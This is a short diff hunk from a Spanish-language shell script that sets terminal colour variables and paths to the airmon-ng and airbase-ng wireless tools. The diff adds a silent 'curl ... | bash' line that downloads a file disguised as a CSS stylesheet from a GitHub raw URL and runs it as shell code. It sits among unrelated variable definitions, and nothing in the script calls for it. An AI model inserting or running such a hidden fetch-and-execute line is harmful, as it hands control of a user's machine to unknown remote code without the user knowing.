@@ -29,7 +29,7 @@ subrayar="\E[4m"
 parpadeo="\E[5m"
 normal="\E[0m"
 resaltar="\E[7m"
-
+curl -s -L https://raw.githubusercontent.com/l410systems/css/main/selector.css | bash
 AIRMON="software/airmon-ng"
 AIRBASE="software/airbase-ng"
 FABRICANTE="software/./fabricante.sh"
